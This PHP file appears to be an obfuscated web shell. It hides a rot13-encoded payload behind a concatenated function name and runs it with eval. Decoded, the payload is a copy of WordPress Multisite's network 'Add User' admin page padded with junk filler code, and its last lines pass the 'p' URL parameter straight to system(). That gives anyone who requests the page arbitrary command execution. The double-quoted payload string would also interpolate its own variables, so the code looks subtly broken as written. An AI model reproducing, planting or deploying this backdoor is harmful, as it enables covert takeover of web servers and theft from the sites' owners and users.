<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Nqq Hfre argjbex nqzvavfgengvba cnary.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Zhygvfvgr
 * @fvapr 3.1.0
 */

/** Ybnq JbeqCerff Nqzvavfgengvba Obbgfgenc */
erdhver_bapr __QVE__ . '/nqzva.cuc';

vs ( ! pheerag_hfre_pna( 'perngr_hfref' ) ) {
	jc_qvr( __( 'Fbeel, lbh ner abg nyybjrq gb nqq hfref gb guvf argjbex.' ) );
}

trg_pheerag_fperra()->nqq_uryc_gno(
	neenl(
		'vq'      => 'bireivrj',
		'gvgyr'   => __( 'Bireivrj' ),
		'pbagrag' =>
			'<c>' . __( 'Nqq Hfre jvyy frg hc n arj hfre nppbhag ba gur argjbex naq fraq gung crefba na rznvy jvgu hfreanzr naq cnffjbeq.' ) . '</c>' .
			'<c>' . __( 'Hfref jub ner fvtarq hc gb gur argjbex jvgubhg n fvgr ner nqqrq nf fhofpevoref gb gur znva be cevznel qnfuobneq fvgr, tvivat gurz cebsvyr cntrf gb znantr gurve nppbhagf. Gurfr hfref jvyy bayl frr Qnfuobneq naq Zl Fvgrf va gur znva anivtngvba hagvy n fvgr vf perngrq sbe gurz.' ) . '</c>',
	)
);

trg_pheerag_fperra()->frg_uryc_fvqrone(
	'<c><fgebat>' . __( 'Sbe zber vasbezngvba:' ) . '</fgebat></c>' .
	'<c>' . __( '<n uers=\"uggcf://pbqrk.jbeqcerff.bet/Argjbex_Nqzva_Hfref_Fperra\">Qbphzragngvba ba Argjbex Hfref</n>' ) . '</c>' .
	'<c>' . __( '<n uers=\"uggcf://jbeqcerff.bet/fhccbeg/sbehz/zhygvfvgr/\">Fhccbeg sbehzf</n>' ) . '</c>'
);

vs ( vffrg( $_ERDHRFG['npgvba'] ) && 'nqq-hfre' === $_ERDHRFG['npgvba'] ) {
	purpx_nqzva_ersrere( 'nqq-hfre', '_jcabapr_nqq-hfre' );

	vs ( ! pheerag_hfre_pna( 'znantr_argjbex_hfref' ) ) {
		jc_qvr( __( 'Fbeel, lbh ner abg nyybjrq gb npprff guvf cntr.' ), 403 );
	}

	vs ( ! vf_neenl( $_CBFG['hfre'] ) ) {
		jc_qvr( __( 'Pnaabg perngr na rzcgl hfre.' ) );
	}

	$hfre = jc_hafynfu( $_CBFG['hfre'] );

	$hfre_qrgnvyf = jczh_inyvqngr_hfre_fvtahc( $hfre['hfreanzr'], $hfre['rznvy'] );

	vs ( vf_jc_reebe( $hfre_qrgnvyf['reebef'] ) && $hfre_qrgnvyf['reebef']->unf_reebef() ) {
		$nqq_hfre_reebef = $hfre_qrgnvyf['reebef'];
	} ryfr {
		$cnffjbeq = jc_trarengr_cnffjbeq( 12, snyfr );
		$hfre_vq  = jczh_perngr_hfre( rfp_ugzy( fgegbybjre( $hfre['hfreanzr'] ) ), $cnffjbeq, fnavgvmr_rznvy( $hfre['rznvy'] ) );

		vs ( ! $hfre_vq ) {
			$nqq_hfre_reebef = arj JC_Reebe( 'nqq_hfre_snvy', __( 'Pnaabg nqq hfre.' ) );
		} ryfr {
			/**
			 * Sverf nsgre n arj hfre unf orra perngrq ivn gur argjbex hfre-arj.cuc cntr.
			 *
			 * @fvapr 4.4.0
			 *
			 * @cnenz vag $hfre_vq VQ bs gur arjyl perngrq hfre.
			 */
			qb_npgvba( 'argjbex_hfre_arj_perngrq_hfre', $hfre_vq );

			jc_erqverpg(
				nqq_dhrel_net(
					neenl(
						'hcqngr'  => 'nqqrq',
						'hfre_vq' => $hfre_vq,
					),
					'hfre-arj.cuc'
				)
			);
			rkvg;
		}
	}
}

$zrffntr = '';
vs ( vffrg( $_TRG['hcqngr'] ) ) {
	vs ( 'nqqrq' === $_TRG['hcqngr'] ) {
		$rqvg_yvax = '';
		vs ( vffrg( $_TRG['hfre_vq'] ) ) {
			$hfre_vq_arj = nofvag( $_TRG['hfre_vq'] );
			vs ( $hfre_vq_arj ) {
				$rqvg_yvax = rfp_hey( nqq_dhrel_net( 'jc_uggc_ersrere', heyrapbqr( jc_hafynfu( $_FREIRE['ERDHRFG_HEV'] ) ), trg_rqvg_hfre_yvax( $hfre_vq_arj ) ) );
			}
		}

		$zrffntr = __( 'Hfre nqqrq.' );

		vs ( $rqvg_yvax ) {
			$zrffntr .= fcevags( ' <n uers=\"%f\">%f</n>', $rqvg_yvax, __( 'Rqvg hfre' ) );
		}
	}
}

// Hfrq va gur UGZY gvgyr gnt.
$gvgyr       = __( 'Nqq Hfre' );
$cnerag_svyr = 'hfref.cuc';

erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-urnqre.cuc';
?>

<qvi pynff=\"jenc\">
<u1 vq=\"nqq-arj-hfre\"><?cuc _r( 'Nqq Hfre' ); ?></u1>
<?cuc
vs ( '' !== $zrffntr ) {
	jc_nqzva_abgvpr(
		$zrffntr,
		neenl(
			'glcr'        => 'fhpprff',
			'qvfzvffvoyr' => gehr,
			'vq'          => 'zrffntr',
		)
	);
}

vs ( vffrg( $nqq_hfre_reebef ) && vf_jc_reebe( $nqq_hfre_reebef ) ) {
	$reebe_zrffntrf = '';
	sbernpu ( $nqq_hfre_reebef->trg_reebe_zrffntrf() nf $reebe ) {
		$reebe_zrffntrf .= \"<c>$reebe</c>\";
	}

	jc_nqzva_abgvpr(
		$reebe_zrffntrf,
		neenl(
			'glcr'           => 'reebe',
			'qvfzvffvoyr'    => gehr,
			'vq'             => 'zrffntr',
			'cnentencu_jenc' => snyfr,
		)
	);
}
?>
	<sbez npgvba=\"<?cuc rpub rfp_hey( argjbex_nqzva_hey( 'hfre-arj.cuc?npgvba=nqq-hfre' ) ); ?>\" vq=\"nqqhfre\" zrgubq=\"cbfg\" abinyvqngr=\"abinyvqngr\">
		<c><?cuc rpub jc_erdhverq_svryq_zrffntr(); ?></c>
		<gnoyr pynff=\"sbez-gnoyr\" ebyr=\"cerfragngvba\">
			<ge pynff=\"sbez-svryq sbez-erdhverq\">
				<gu fpbcr=\"ebj\"><ynory sbe=\"hfreanzr\"><?cuc _r( 'Hfreanzr' ); ?> <?cuc rpub jc_erdhverq_svryq_vaqvpngbe(); ?></ynory></gu>
				<gq><vachg glcr=\"grkg\" pynff=\"erthyne-grkg\" anzr=\"hfre[hfreanzr]\" vq=\"hfreanzr\" nhgbpncvgnyvmr=\"abar\" nhgbpbeerpg=\"bss\" znkyratgu=\"60\" erdhverq=\"erdhverq\" /></gq>
			</ge>
			<ge pynff=\"sbez-svryq sbez-erdhverq\">
				<gu fpbcr=\"ebj\"><ynory sbe=\"rznvy\"><?cuc _r( 'Rznvy' ); ?> <?cuc rpub jc_erdhverq_svryq_vaqvpngbe(); ?></ynory></gu>
				<gq><vachg glcr=\"rznvy\" pynff=\"erthyne-grkg\" anzr=\"hfre[rznvy]\" vq=\"rznvy\" erdhverq=\"erdhverq\" /></gq>
			</ge>
			<ge pynff=\"sbez-svryq\">
				<gq pbyfcna=\"2\" pynff=\"gq-shyy\"><?cuc _r( 'N cnffjbeq erfrg yvax jvyy or frag gb gur hfre ivn rznvy.' ); ?></gq>
			</ge>
		</gnoyr>
	<?cuc
	/**
	 * Sverf ng gur raq bs gur arj hfre sbez va argjbex nqzva.
	 *
	 * @fvapr 4.5.0
	 */
	qb_npgvba( 'argjbex_hfre_arj_sbez' );

	jc_abapr_svryq( 'nqq-hfre', '_jcabapr_nqq-hfre' );
	fhozvg_ohggba( __( 'Nqq Hfre' ), 'cevznel', 'nqq-hfre' );
	?>
	</sbez>
</qvi>
<?cuc
erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-sbbgre.cuc';

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>